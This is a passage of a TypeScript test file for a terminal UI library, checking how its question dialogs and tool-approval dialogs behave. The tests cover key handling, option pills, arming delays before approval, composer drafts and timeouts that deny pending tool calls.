import { afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "bun:test";
import { KeybindingsManager } from "@oh-my-pi/pi-tui/app-keybindings";
import { setKeybindings, type Component, type TerminalFrameProvider, type TUI } from "@oh-my-pi/pi-tui";
import { stripVTControlCharacters } from "node:util";
import { md } from "@oh-my-pi/pi-tui/native/describe";
import type { DescribeContext, NativeChild, NativeNode, NativeSurfaceProvider } from "@oh-my-pi/pi-tui/native/node";
import { AskDialogComponent, type ExtensionAskDialogQuestion } from "@oh-my-pi/pi-tui/overlays/ask-dialog";
import { APPROVE_ARM_MS, ApprovalDialogComponent } from "@oh-my-pi/pi-tui/overlays/approval-dialog";
import { LoginDialogComponent } from "@oh-my-pi/pi-tui/overlays/login-dialog";
import { PlanReviewOverlay } from "@oh-my-pi/pi-tui/overlays/plan-review-overlay";
import { setNativeRendering } from "@oh-my-pi/pi-tui/native/state";
import { PREVIEW_LIMITS } from "@oh-my-pi/pi-tui/render/render-utils";
import { getThemeByName, setThemeInstance } from "@oh-my-pi/pi-tui/theme";
import { TspHarness } from "./native/tsp-harness";

const ENTER = "\n";
const UP = "\x1b[A";
const DOWN = "\x1b[B";
const RIGHT = "\x1b[C";
const LEFT = "\x1b[D";
const SHIFT_RIGHT = "\x1b[1;2C";
const SHIFT_LEFT = "\x1b[1;2D";

/** A terminal that draws every kind (`meter` included). */
const CX: DescribeContext = { cols: 100, reduceMotion: false, dark: true, supports: () => true, feature: () => true };
/** A Tern without the plan review's `doc` and dock kinds. */
const LEGACY: DescribeContext = { ...CX, supports: kind => kind !== "doc" && kind !== "buttons" && kind !== "menu" };

const PLAN = "# Plan\n\n## Alpha\n\nfirst\n\n## Beta\n\nsecond\n\n## Gamma\n\nthird\n";
const PLAN_CHOICES = [
	{ id: "execute", label: "Approve and execute", detail: "Start fresh with just the plan" },
	{ id: "compact", label: "Approve and compact context" },
	{ id: "keep", label: "Approve and keep context", meta: "~378k / 1m", disabled: "Context is too full" },
];

function isNode(child: NativeChild): child is NativeNode {
	return "k" in child && typeof child.k === "string";
}

/** Depth-first search over described nodes, with the keypath the reconciler reports (hoisted overlays get `^`). */
function find(
	root: NativeNode,
	predicate: (node: NativeNode) => boolean,
	path = "",
): { node: NativeNode; path: string } | undefined {
	for (const [index, child] of (root.c ?? []).entries()) {
		if (!isNode(child)) continue;
		const segment = child.k === "overlay" ? `^${child.key ?? index}` : `${child.key ?? index}`;
		const childPath = path ? `${path}/${segment}` : segment;
		if (predicate(child)) return { node: child, path: childPath };
		const found = find(child, predicate, childPath);
		if (found) return found;
	}
	return undefined;
}

const QUESTIONS: ExtensionAskDialogQuestion[] = [
	{
		id: "policy",
		question: "How should frames without credits be handled?",
		options: [{ label: "Drop them" }, { label: "Park them" }, { label: "Block" }],
		recommended: 1,
	},
	{ id: "flag", question: "Ship behind a flag?", options: [{ label: "Yes" }, { label: "No" }] },
];

function ask(onSubmit = vi.fn(), onCancel = vi.fn()): AskDialogComponent {
	return new AskDialogComponent(QUESTIONS, { onSubmit, onCancel, onPrompt: async () => undefined });
}

/** Every described node matching `predicate`, depth first. */
function all(root: NativeNode, predicate: (node: NativeNode) => boolean): NativeNode[] {
	const out: NativeNode[] = [];
	for (const child of root.c ?? []) {
		if (!isNode(child)) continue;
		if (predicate(child)) out.push(child);
		out.push(...all(child, predicate));
	}
	return out;
}

/** A question with more options than a fold shows, and a multi-select. */
const WIDE: ExtensionAskDialogQuestion[] = [
	QUESTIONS[0]!,
	{
		id: "region",
		question: "Which region?",
		options: ["us-east-1", "us-west-2", "eu-west-1", "a very long region label", "ap-south-1", "sa-east-1"].map(
			label => ({ label }),
		),
	},
	{ id: "checks", question: "Which checks?", multi: true, options: [{ label: "lint" }, { label: "test" }] },
];

/** The open question's key. */
function openKey(dialog: AskDialogComponent): string | undefined {
	return find(dialog.describe(CX), node => node.p?.role === "omp.ask.open")?.node.key;
}

/** The open question's reveal counter. */
function revealOf(dialog: AskDialogComponent): number {
	const open = find(dialog.describe(CX), node => node.p?.role === "omp.ask.open")?.node as
		| { reveal?: { n: number } }
		| undefined;
	if (!open?.reveal) throw new Error("no open question");
	return open.reveal.n;
}

function progress(dialog: AskDialogComponent): string | undefined {
	const head = find(dialog.describe(CX), node => node.p?.role === "omp.ask.card.progress")?.node.p as
		| { spans: { t: string }[] }
		| undefined;
	return head?.spans[0]?.t;
}

function pillNodes(dialog: AskDialogComponent, key: string): { node: NativeNode; path: string }[] {
	const fold = find(dialog.describe(CX), node => node.p?.role === "omp.ask.fold" && node.key === key);
	if (!fold) return [];
	const out: { node: NativeNode; path: string }[] = [];
	const walk = (root: NativeNode, path: string): void => {
		for (const [index, child] of (root.c ?? []).entries()) {
			if (!isNode(child)) continue;
			const childPath = `${path}/${child.key ?? index}`;
			if (child.p?.role === "omp.ask.pill" || child.p?.role === "omp.ask.pill.more")
				out.push({ node: child, path: childPath });
			walk(child, childPath);
		}
	};
	walk(fold.node, fold.path);
	return out;
}

/** A pill's label, `✓ ` before a chosen (pressed) one. */
function pillLabel(pill: NativeNode): string {
	const p = pill.k === "button" ? pill.p : undefined;
	return `${p?.on ? "✓ " : ""}${p?.text ?? ""}`;
}

/** A folded question's pill labels, `+N` included. */
function pills(dialog: AskDialogComponent, key: string): string[] {
	return pillNodes(dialog, key).map(pill => pillLabel(pill.node));
}

function clickPill(dialog: AskDialogComponent, key: string, label: string): void {
	const pill = pillNodes(dialog, key).find(entry => pillLabel(entry.node) === label);
	if (!pill) throw new Error(`no ${label} pill on ${key}`);
	const act = pill.node.k === "button" ? pill.node.p?.actions?.click : undefined;
	if (typeof act !== "string") throw new Error(`${label} pill has no click action`);
	dialog.handleNativeEvent({ type: "action", key: pill.path, act, mods: [] });
}

function press(dialog: AskDialogComponent, act: string): void {
	const button = find(dialog.describe(CX), node => node.p?.role === "omp.btn" && node.key === act);
	if (!button) throw new Error(`no ${act} button`);
	dialog.handleNativeEvent({ type: "action", key: button.path, act, mods: [] });
}

describe("dialogs under a native surface", () => {
	beforeAll(async () => {
		const dark = await getThemeByName("dark");
		if (!dark) throw new Error("dark theme unavailable");
		setThemeInstance(dark);
	});

	beforeEach(() => {
		setKeybindings(KeybindingsManager.inMemory({ "tui.select.cancel": "escape" }));
	});

	afterEach(() => {
		setKeybindings(KeybindingsManager.inMemory());
	});

	it("ask: one inline card; the first question opens, the others fold to their question over option pills", () => {
		const dialog = new AskDialogComponent(WIDE, {
			onSubmit: vi.fn(),
			onCancel: vi.fn(),
			onPrompt: async () => undefined,
		});
		const root = dialog.describe(CX);
		expect(root.p?.role).toBe("omp.ask.card");
		expect(progress(dialog)).toBe("0 of 3 answered");
		expect(openKey(dialog)).toBe("q0");
		expect(find(root, node => node.p?.role === "omp.ask.options")?.node.key).toBe("q0");
		// Four pills, labels cut at 20 cells, then `+N`.
		expect(pills(dialog, "q1")).toEqual(["us-east-1", "us-west-2", "eu-west-1", "a very long region…", "+2"]);
		expect(pills(dialog, "q2")).toEqual(["lint", "test"]);
		// No tabs, Review, Next or Hide natively.
		expect(find(root, node => node.k === "tabs")).toBeUndefined();
		const buttons = all(root, node => node.p?.role === "omp.btn").map(button => button.key);
		expect(buttons).toEqual(["note", "cancel", "submit"]);
	});

	it("ask: a pill picks from a folded question without opening it; the pick shows marked among its options", () => {
		const dialog = new AskDialogComponent(WIDE, {
			onSubmit: vi.fn(),
			onCancel: vi.fn(),
			onPrompt: async () => undefined,
		});
		const reveal = revealOf(dialog);
		clickPill(dialog, "q1", "eu-west-1");
		expect(pills(dialog, "q1")).toEqual(["us-east-1", "us-west-2", "✓ eu-west-1", "a very long region…", "+2"]);
		expect(openKey(dialog)).toBe("q0");
		expect(revealOf(dialog)).toBe(reveal);
		expect(progress(dialog)).toBe("1 of 3 answered");
		// A multi-select flips its pills: on, then off again.
		clickPill(dialog, "q2", "test");
		expect(pills(dialog, "q2")).toEqual(["lint", "✓ test"]);
		clickPill(dialog, "q2", "✓ test");
		expect(pills(dialog, "q2")).toEqual(["lint", "test"]);
		// A click on the fold opens it.
		const fold = find(dialog.describe(CX), node => node.p?.role === "omp.ask.fold" && node.key === "q1")!;
		dialog.handleNativeEvent({ type: "action", key: fold.path, act: "open:1", mods: [] });
		expect(openKey(dialog)).toBe("q1");
		expect(revealOf(dialog)).toBe(reveal + 1);
	});

	it("ask: ↓ past the last row opens the next question at its first row, ↑ goes back to its last; ←/→ open neighbours", () => {
		const dialog = ask();
		const selected = () =>
			(
				find(dialog.describe(CX), node => node.p?.role === "omp.ask.options")?.node.p as
					| { selected?: string }
					| undefined
			)?.selected;
		setNativeRendering(true);
		try {
			const reveal = revealOf(dialog);
			// The recommended row, then Block and Other.
			dialog.handleInput(DOWN);
			dialog.handleInput(DOWN);
			expect([openKey(dialog), selected()]).toEqual(["q0", "other"]);
			dialog.handleInput(DOWN);
			expect([openKey(dialog), selected()]).toEqual(["q1", "option:0"]);
			expect(revealOf(dialog)).toBe(reveal + 1);
			dialog.handleInput(UP);
			expect([openKey(dialog), selected()]).toEqual(["q0", "other"]);
			dialog.handleInput(RIGHT);
			dialog.handleInput(RIGHT);
			expect(openKey(dialog)).toBe("q1");
			dialog.handleInput(LEFT);
			expect(openKey(dialog)).toBe("q0");
			// Hide does nothing natively.
			dialog.handleInput("\x1bh");
			expect(openKey(dialog)).toBe("q0");
		} finally {
			setNativeRendering(false);
		}
	});

	it("ask: Submit and Enter on the last question send every answer, else open the first unanswered question", () => {
		const onSubmit = vi.fn();
		const dialog = ask(onSubmit);
		setNativeRendering(true);
		try {
			dialog.handleInput(RIGHT);
			press(dialog, "submit");
			expect(onSubmit).not.toHaveBeenCalled();
			expect(openKey(dialog)).toBe("q0");
			// Enter picks the highlighted (recommended) answer and opens the next question.
			dialog.handleInput(ENTER);
			expect(openKey(dialog)).toBe("q1");
			dialog.handleInput(ENTER);
			expect(
				onSubmit.mock.calls[0]?.[0].results.map((r: { selectedOptions: string[] }) => r.selectedOptions),
			).toEqual([["Park them"], ["Yes"]]);

			// Enter on the last question with an earlier one unanswered opens it; Submit there sends the rest unanswered.
			const partial = vi.fn();
			const other = ask(partial);
			other.handleInput(RIGHT);
			other.handleInput(ENTER);
			expect(partial).not.toHaveBeenCalled();
			expect(openKey(other)).toBe("q0");
			press(other, "submit");
			expect(
				partial.mock.calls[0]?.[0].results.map((r: { selectedOptions: string[] }) => r.selectedOptions),
			).toEqual([[], ["Yes"]]);
		} finally {
			setNativeRendering(false);
		}
	});

	it("ask: a click on an open answer picks it and opens the next question; a custom answer folds to its text", async () => {
		const onPrompt = vi.fn(async () => "my own words");
		const onSubmit = vi.fn();
		const dialog = new AskDialogComponent(QUESTIONS, { onSubmit, onCancel: vi.fn(), onPrompt });
		const options = find(dialog.describe(CX), node => node.p?.role === "omp.ask.options");
		dialog.handleNativeEvent({ type: "activate", key: options!.path, item: "other" });
		// The dialog awaits this same promise first, so its answer handling has run once it settles.
		await onPrompt.mock.results[0]?.value;
		expect(openKey(dialog)).toBe("q1");
		const answer = find(dialog.describe(CX), node => node.p?.role === "omp.ask.fold.answer")?.node;
		const spans = answer?.k === "text" ? answer.p?.spans : undefined;
		expect(spans?.map(part => part.t).join("")).toBe("Other: “my own words”");
		const next = find(dialog.describe(CX), node => node.p?.role === "omp.ask.options");
		expect(next?.node.key).toBe("q1");
		dialog.handleNativeEvent({ type: "activate", key: next!.path, item: "option:1" });
		expect(onSubmit.mock.calls[0]?.[0].results.map((r: { customInput?: string }) => r.customInput)).toEqual([
			"my own words",
			undefined,
		]);
	});

	it("ask: sits in the transcript as a card, not a modal sheet", async () => {
		const transcript: Component = { render: () => [], invalidate: () => {}, describe: () => md("Why this decision") };
		const dialog = ask();
		const provider: TerminalFrameProvider & NativeSurfaceProvider = {
			renderFrame: () => ({ viewport: [] }),
			acknowledgeHistory: () => {},
			describeSurface: () => ({ main: [transcript, dialog], dock: [] }),
		};
		const harness = await TspHarness.start(tui => {
			tui.setFrameProvider(provider);
			tui.setFocus(dialog);
		});
		try {
			expect(harness.errors).toEqual([]);
			expect(harness.region("layer")?.c ?? []).toEqual([]);
			const card = harness.find(node => node.p?.role === "omp.ask.card");
			expect(card).toBeDefined();
			expect(JSON.stringify(harness.region("main"))).toContain(card!.id);
			expect(harness.findAll(node => node.k === "overlay")).toEqual([]);
		} finally {
			harness.stop();
		}
	});

	it("ask: a chosen answer is marked apart from the highlighted row", () => {
		const dialog = ask();
		const item = (key: string) => find(dialog.describe(CX), node => node.k === "item" && node.key === key)?.node.p;
		// The highlighted (recommended) row is not chosen until Enter.
		expect(item("option:1")?.tone).toBeUndefined();
		setNativeRendering(true);
		try {
			dialog.handleInput(ENTER);
			dialog.handleInput(LEFT);
		} finally {
			setNativeRendering(false);
		}
		expect(item("option:1")?.tone).toBe("accent");
		expect(item("option:0")?.tone).toBeUndefined();
	});

	it("ask: Esc hands the keys to the composer, the keyless Cancel cancels; the recommended option loses its suffix for the badge", () => {
		const onCancel = vi.fn();
		const releaseKeys = vi.fn();
		const dialog = new AskDialogComponent(
			QUESTIONS,
			{ onSubmit: vi.fn(), onCancel, onPrompt: async () => undefined },
			{ releaseKeys },
		);
		const card = dialog.describe(CX);
		const recommended = find(card, node => node.k === "item" && node.key === "option:1");
		expect(recommended?.node.p).toMatchObject({ label: [{ t: "Park them" }], value: [{ t: "Recommended" }] });
		const cancel = find(card, node => node.key === "cancel")?.node;
		expect(cancel?.p).toMatchObject({ title: "Cancel without answering" });
		expect(cancel?.p).not.toHaveProperty("keys");
		setNativeRendering(true);
		try {
			dialog.handleInput("\x1b");
		} finally {
			setNativeRendering(false);
		}
		expect(releaseKeys).toHaveBeenCalledTimes(1);
		expect(onCancel).not.toHaveBeenCalled();
		press(dialog, "cancel");
		expect(onCancel).toHaveBeenCalledTimes(1);
	});

	it("ask: the skip notice dims the questions and warns while the composer draft would skip the ask", () => {
		let notice: string | undefined = "Sending your draft skips this question";
		const dialog = new AskDialogComponent(
			QUESTIONS,
			{ onSubmit: vi.fn(), onCancel: vi.fn(), onPrompt: async () => undefined },
			{ skipNotice: () => notice },
		);
		const skip = () =>
			find(dialog.describe(CX), node => node.p?.role === "omp.ask.skip")?.node.p as
				| { spans: { t: string }[] }
				| undefined;
		const body = () => find(dialog.describe(CX), node => node.p?.role === "omp.ask.card.body")?.node.p;
		expect(skip()?.spans[0]?.t).toBe("⚠ Sending your draft skips this question");
		expect(body()?.mark).toBe("drop");
		notice = undefined;
		expect(skip()).toBeUndefined();
		expect(body()?.mark).toBeUndefined();
	});

	it("ask: hiding (Alt+H) never answers; Enter restores the same pending question", () => {
		const onSubmit = vi.fn();
		const onCancel = vi.fn();
		const dialog = ask(onSubmit, onCancel);

		dialog.handleInput("\x1bh");
		expect(dialog.render(80)).toHaveLength(1);
		dialog.handleInput(ENTER);
		expect(dialog.render(80).length).toBeGreaterThan(1);
		expect(onSubmit).not.toHaveBeenCalled();
		expect(onCancel).not.toHaveBeenCalled();

		dialog.handleInput(ENTER);
		dialog.handleInput(ENTER);
		dialog.handleInput(ENTER);
		expect(onSubmit.mock.calls[0]?.[0].results.map((r: { selectedOptions: string[] }) => r.selectedOptions)).toEqual([
			["Park them"],
			["Yes"],
		]);
	});

	it("approval: Enter and the follow-up chord are ignored until armed; then Enter takes the highlighted choice", () => {
		const prompt = "Allow tool: write\nPath: /tmp/out.txt";
		const now = vi.spyOn(performance, "now").mockReturnValue(1_000);
		try {
			const keyed = { onApprove: vi.fn(), onDeny: vi.fn() };
			const dialog = new ApprovalDialogComponent(prompt, keyed);
			// An Enter typed for the composer, and a follow-up (Ctrl+Enter, Ctrl+Q) sent as the prompt mounts.
			for (const key of [ENTER, "\r", "\x1b[13;5u", "\x11"]) dialog.handleInput(key);
			now.mockReturnValue(1_000 + APPROVE_ARM_MS - 1);
			dialog.handleInput("\x1b[13;5u");
			dialog.handleInput(ENTER);
			expect(keyed.onApprove).not.toHaveBeenCalled();
			expect(keyed.onDeny).not.toHaveBeenCalled();
			now.mockReturnValue(1_000 + APPROVE_ARM_MS);
			dialog.handleInput("\x1b[13;5u");
			// Settled once: a later Esc does not also deny.
			dialog.handleInput("\x1b");
			expect(keyed.onApprove).toHaveBeenCalledTimes(1);
			expect(keyed.onDeny).not.toHaveBeenCalled();

			// The arrows wrap between Approve and Deny; Enter takes the highlighted one.
			const listed = { onApprove: vi.fn(), onDeny: vi.fn() };
			const list = new ApprovalDialogComponent(prompt, listed);
			now.mockReturnValue(1_000 + 2 * APPROVE_ARM_MS);
			list.handleInput(UP);
			expect(stripVTControlCharacters(list.render(60).join("\n"))).toMatch(/\S Deny/);
			list.handleInput(ENTER);
			expect(listed.onDeny).toHaveBeenCalledTimes(1);
			expect(listed.onApprove).not.toHaveBeenCalled();
			const defaulted = { onApprove: vi.fn(), onDeny: vi.fn() };
			const approveFirst = new ApprovalDialogComponent(prompt, defaulted);
			now.mockReturnValue(1_000 + 3 * APPROVE_ARM_MS);
			approveFirst.handleInput(ENTER);
			expect(defaulted.onApprove).toHaveBeenCalledTimes(1);
			// Denying and clicking Approve are deliberate, so neither waits to arm.
			const denied = { onApprove: vi.fn(), onDeny: vi.fn() };
			new ApprovalDialogComponent(prompt, denied).handleInput("\x1b");
			expect(denied.onDeny).toHaveBeenCalledTimes(1);
			const pointed = { onApprove: vi.fn(), onDeny: vi.fn() };
			const clicked = new ApprovalDialogComponent(prompt, pointed);
			const approve = find(clicked.describe(), node => node.p?.role === "omp.btn" && node.key === "approve");
			clicked.handleNativeEvent({ type: "action", key: approve!.path, act: "approve", mods: [] });
			expect(pointed.onApprove).toHaveBeenCalledTimes(1);
		} finally {
			now.mockRestore();
		}
	});

	it("approval: the session row sits between Approve and Deny; the arrows reach it, Enter or a Tern click takes it", () => {
		const now = vi.spyOn(performance, "now").mockReturnValue(1_000);
		try {
			const callbacks = { onApprove: vi.fn(), onDeny: vi.fn() };
			const onSession = vi.fn();
			const dialog = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls", callbacks, {
				session: { label: "Approve bash for this session", onApprove: onSession },
			});
			const rows = () =>
				stripVTControlCharacters(dialog.render(80).join("\n"))
					.split("\n")
					.filter(line => /Approve|Deny/.test(line));
			const choices = () => find(dialog.describe(), node => node.p?.role === "omp.approval.choices")!;
			const selected = () => {
				const props = choices().node.p;
				return props && "selected" in props ? props.selected : undefined;
			};
			expect(rows().map(line => line.replace(/[│❯>\s]+/g, " ").trim())).toEqual([
				"Approve",
				"Approve bash for this session",
				"Deny",
			]);
			dialog.handleInput(DOWN);
			// Tern's list shows the same highlight the arrows moved.
			expect(selected()).toBe("session");
			now.mockReturnValue(1_000 + APPROVE_ARM_MS);
			dialog.handleInput(ENTER);
			expect(onSession).toHaveBeenCalledTimes(1);
			expect(callbacks.onApprove).not.toHaveBeenCalled();

			const clicked = { onApprove: vi.fn(), onDeny: vi.fn() };
			const pointed = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls", clicked);
			const list = find(pointed.describe(), node => node.p?.role === "omp.approval.choices")!;
			pointed.handleNativeEvent({ type: "select", key: list.path, item: "deny" });
			expect(clicked.onDeny).toHaveBeenCalledTimes(1);
		} finally {
			now.mockRestore();
		}
	});

	it("approval: grants sit above Approve Once, the toggle keeps them across sessions, Enter or a Tern click takes one", () => {
		const now = vi.spyOn(performance, "now").mockReturnValue(1_000);
		try {
			const callbacks = { onApprove: vi.fn(), onDeny: vi.fn() };
			const onGrant = vi.fn();
			const folder = { label: "Approve Directory: ~/src", alwaysLabel: "Always Approve Directory: ~/src" };
			const file = { label: "Approve File", alwaysLabel: "Always Approve File" };
			const dialog = new ApprovalDialogComponent("Allow tool: write\nPath: a.ts", callbacks, {
				grants: [folder, file],
				onGrant,
			});
			const rows = () =>
				stripVTControlCharacters(dialog.render(80).join("\n"))
					.split("\n")
					.filter(line => /Approve|Deny|Remember/.test(line))
					.map(line => line.replace(/[│❯>\s]+/g, " ").trim());
			expect(rows().slice(1)).toEqual(["Approve Directory: ~/src", "Approve File", "Approve Once", "Deny"]);
			now.mockReturnValue(1_000 + APPROVE_ARM_MS);
			// Approve Once is highlighted on mount: the least the call can be granted.
			for (let step = 0; step < 3; step++) dialog.handleInput(UP);
			dialog.handleInput(ENTER);
			expect(rows().slice(1, 3)).toEqual(["Always Approve Directory: ~/src", "Always Approve File"]);
			dialog.handleInput(DOWN);
			dialog.handleInput(DOWN);
			dialog.handleInput(ENTER);
			expect(onGrant).toHaveBeenCalledWith(file, true);
			expect(callbacks.onApprove).not.toHaveBeenCalled();

			const clicked = vi.fn();
			const pointed = new ApprovalDialogComponent("Allow tool: write\nPath: a.ts", callbacks, {
				grants: [folder, file],
				onGrant: clicked,
			});
			const list = find(pointed.describe(), node => node.p?.role === "omp.approval.choices")!;
			pointed.handleNativeEvent({ type: "select", key: list.path, item: "grant0" });
			expect(clicked).toHaveBeenCalledWith(folder, false);
		} finally {
			now.mockRestore();
		}
	});

	it("approval: a draft moves the highlight to Deny and relabels it", () => {
		let draft = "";
		const dialog = new ApprovalDialogComponent(
			"Allow tool: bash\nCommand: ls",
			{ onApprove: vi.fn(), onDeny: vi.fn() },
			{
				draft: { hasDraft: () => draft.length > 0, pasteInFlight: () => false, handleInput: key => (draft += key) },
			},
		);
		const highlighted = () =>
			stripVTControlCharacters(dialog.render(80).join("\n"))
				.split("\n")
				.find(line => line.includes("❯"));
		const selected = () => {
			const choices = find(dialog.describe(), node => node.p?.role === "omp.approval.choices")!;
			return choices.node.p && "selected" in choices.node.p ? choices.node.p.selected : undefined;
		};
		expect(highlighted()).toContain("Approve");
		expect(selected()).toBe("once");
		dialog.handleInput("k");
		expect(highlighted()).toContain("Deny and send message");
		expect(selected()).toBe("deny");
		draft = "";
		expect(highlighted()).toContain("Approve");
		dialog.dispose();
	});

	it("approval: Enter with a draft sends through the composer, and Esc denies without sending", () => {
		const routed: string[] = [];
		const callbacks = { onApprove: vi.fn(), onDeny: vi.fn() };
		const dialog = new ApprovalDialogComponent("Allow tool: task\nSubagents: 2", callbacks, {
			session: { label: "Approve task for this session", onApprove: vi.fn() },
			draft: { hasDraft: () => true, pasteInFlight: () => false, handleInput: key => routed.push(key) },
		});
		dialog.handleInput(ENTER);
		expect(routed).toEqual([ENTER]);
		expect(callbacks.onApprove).not.toHaveBeenCalled();
		expect(callbacks.onDeny).not.toHaveBeenCalled();
		dialog.handleInput("\x1b");
		expect(callbacks.onDeny).toHaveBeenCalledTimes(1);
		expect(routed).toEqual([ENTER]);
		dialog.dispose();
	});

	it("approval: arrows edit the draft while one holds keys and move the highlight without one", () => {
		const routed: string[] = [];
		const drafting = new ApprovalDialogComponent(
			"Allow tool: bash\nCommand: ls",
			{ onApprove: vi.fn(), onDeny: vi.fn() },
			{ draft: { hasDraft: () => true, pasteInFlight: () => false, handleInput: key => routed.push(key) } },
		);
		drafting.handleInput(DOWN);
		drafting.handleInput(UP);
		expect(routed).toEqual([DOWN, UP]);

		const idle = new ApprovalDialogComponent(
			"Allow tool: bash\nCommand: ls",
			{ onApprove: vi.fn(), onDeny: vi.fn() },
			{ grants: [{ label: "Approve Folder", alwaysLabel: "Always Approve Folder" }], onGrant: vi.fn() },
		);
		const cursorRow = () =>
			stripVTControlCharacters(idle.render(80).join("\n"))
				.split("\n")
				.find(line => line.includes("❯"));
		expect(cursorRow()).toContain("Approve Once");
		idle.handleInput(UP);
		expect(cursorRow()).toContain("Approve Folder");
		drafting.dispose();
		idle.dispose();
	});

	it("approval: with a composer draft, typing, arrows, and Enter all belong to the composer", () => {
		let draft = "";
		const routed: string[] = [];
		const callbacks = { onApprove: vi.fn(), onDeny: vi.fn() };
		const details = Array.from({ length: 20 }, (_, i) => `Line ${i}`).join("\n");
		const dialog = new ApprovalDialogComponent(`Allow tool: bash\n${details}`, callbacks, {
			draft: {
				hasDraft: () => draft.length > 0,
				pasteInFlight: () => false,
				handleInput: key => {
					routed.push(key);
					if (key.length === 1 && key >= " ") draft += key;
				},
			},
		});
		// Empty composer: Enter (before the dialog arms) neither submits nor interrupts, and Page Down scrolls the details.
		dialog.handleInput(ENTER);
		dialog.handleInput("\x1b[6~");
		expect(routed).toEqual([]);
		expect(stripVTControlCharacters(dialog.render(60).join("\n"))).not.toContain("Line 0");
		dialog.handleInput("n");
		dialog.handleInput("o");
		dialog.handleInput(UP);
		dialog.handleInput(ENTER);
		// Ctrl+C is both a cancel key and the composer's clear key: with a draft it clears, never denies.
		dialog.handleInput("\x03");
		expect(routed).toEqual(["n", "o", UP, ENTER, "\x03"]);
		expect(callbacks.onApprove).not.toHaveBeenCalled();
		expect(callbacks.onDeny).not.toHaveBeenCalled();
		// Esc stays the dialog's: it denies without touching the draft.
		dialog.handleInput("\x1b");
		expect(callbacks.onDeny).toHaveBeenCalledTimes(1);
		expect(routed).toHaveLength(5);
		dialog.dispose();
	});

	it("approval: the approve chord waits for the arm window, and a dispatch keeps the prompt live", async () => {
		const base = Date.now();
		let clock = base;
		const nowSpy = vi.spyOn(performance, "now").mockImplementation(() => clock);
		try {
			let draft = "";
			const routed: string[] = [];
			const callbacks = { onApprove: vi.fn(async () => true), onDeny: vi.fn() };
			const dialog = new ApprovalDialogComponent("Allow tool: bash", callbacks, {
				draft: {
					hasDraft: () => draft.length > 0,
					pasteInFlight: () => false,
					handleInput: key => {
						routed.push(key);
						if (key.length === 1 && key >= " ") draft += key;
					},
				},
			});
			// Inside the arm window the chord answers nothing.
			dialog.handleInput("n");
			dialog.handleInput("\x11");
			expect(callbacks.onApprove).not.toHaveBeenCalled();
			clock = base + APPROVE_ARM_MS + 1;
			dialog.handleInput("\x11");
			expect(callbacks.onApprove).toHaveBeenCalledTimes(1);
			await Promise.resolve();
			// The command owns the keys, and Esc answers the still-open prompt.
			dialog.handleInput("x");
			expect(routed).toEqual(["n", "x"]);
			dialog.handleInput("\x1b");
			expect(callbacks.onDeny).toHaveBeenCalledTimes(1);
			dialog.dispose();
		} finally {
			nowSpy.mockRestore();
		}
	});

	it("approval: the deadline waits while a dispatched command owns the keys", async () => {
		vi.useFakeTimers();
		try {
			const gate = Promise.withResolvers<boolean>();
			const callbacks = { onApprove: vi.fn(() => gate.promise), onDeny: vi.fn() };
			const onTimeout = vi.fn();
			const dialog = new ApprovalDialogComponent("Allow tool: bash", callbacks, {
				timeout: 1_000,
				onTimeout,
			});
			vi.advanceTimersByTime(APPROVE_ARM_MS + 1);
			dialog.handleInput("\x11");
			expect(callbacks.onApprove).toHaveBeenCalledTimes(1);
			// The command owns the keys, so the deadline waits.
			vi.advanceTimersByTime(1_000);
			expect(onTimeout).not.toHaveBeenCalled();
			expect(callbacks.onDeny).not.toHaveBeenCalled();
			gate.resolve(false);
			await Promise.resolve();
			await Promise.resolve();
			vi.advanceTimersByTime(1_000);
			expect(onTimeout).not.toHaveBeenCalled();
			dialog.dispose();
		} finally {
			vi.useRealTimers();
		}
	});

	it("approval: a rejected approve callback denies the call", async () => {
		vi.useFakeTimers();
		try {
			const callbacks = {
				onApprove: vi.fn(async () => {
					throw new Error("dispatch failed");
				}),
				onDeny: vi.fn(),
			};
			const onTimeout = vi.fn();
			const dialog = new ApprovalDialogComponent("Allow tool: bash", callbacks, {
				timeout: 1_000,
				onTimeout,
			});
			vi.advanceTimersByTime(APPROVE_ARM_MS + 1);
			dialog.handleInput("\x11");
			await Promise.resolve();
			await Promise.resolve();
			expect(callbacks.onDeny).toHaveBeenCalledTimes(1);
			vi.advanceTimersByTime(1_000);
			expect(onTimeout).not.toHaveBeenCalled();
			dialog.dispose();
		} finally {
			vi.useRealTimers();
		}
	});

	it("approval: any key restarts the timeout (reporting start and reset), so a scroll before the deadline keeps it open", () => {
		vi.useFakeTimers();
		const callbacks = { onApprove: vi.fn(), onDeny: vi.fn() };
		const onTimeout = vi.fn();
		const onTimeoutStart = vi.fn();
		const onTimeoutReset = vi.fn();
		const dialog = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls", callbacks, {
			timeout: 1_000,
			onTimeout,
			onTimeoutStart,
			onTimeoutReset,
		});
		try {
			expect(onTimeoutStart).toHaveBeenCalledTimes(1);
			vi.advanceTimersByTime(900);
			dialog.handleInput(DOWN);
			expect(onTimeoutReset).toHaveBeenCalledTimes(1);
			vi.advanceTimersByTime(200);
			expect(onTimeout).not.toHaveBeenCalled();
			expect(callbacks.onDeny).not.toHaveBeenCalled();
			vi.advanceTimersByTime(800);
			expect(onTimeout).toHaveBeenCalledTimes(1);
			expect(callbacks.onDeny).toHaveBeenCalledTimes(1);
		} finally {
			dialog.dispose();
			vi.useRealTimers();
		}
	});

	it("approval: expanding the details from the host's key or Details restarts the timeout too", () => {
		vi.useFakeTimers();
		const callbacks = { onApprove: vi.fn(), onDeny: vi.fn() };
		const onTimeoutReset = vi.fn();
		const dialog = new ApprovalDialogComponent("Allow tool: bash\nCommand: ls …", callbacks, {
			fullPrompt: "Allow tool: bash\nCommand: ls\n-la",
			timeout: 1_000,
			onTimeoutReset,
		});
		try {
			vi.advanceTimersByTime(900);
			expect(dialog.toggleDetails()).toBe(true);
			vi.advanceTimersByTime(900);
			const expand = find(dialog.describe(), node => node.p?.role === "omp.btn" && node.key === "expand");
			dialog.handleNativeEvent({ type: "action", key: expand!.path, act: "expand", mods: [] });
			vi.advanceTimersByTime(900);
			expect(onTimeoutReset).toHaveBeenCalledTimes(2);
			expect(callbacks.onDeny).not.toHaveBeenCalled();
		} finally {
			dialog.dispose();
			vi.useRealTimers();
		}
	});

	it("approval: native details sit in a capped scroller, compact or expanded, and Page Down scrolls it, so the choices and action bar stay on screen", () => {
		const content = Array.from({ length: 60 }, (_, i) => `line ${i} ${"x".repeat(80)}`).join("\n");
		const dialog = new ApprovalDialogComponent(
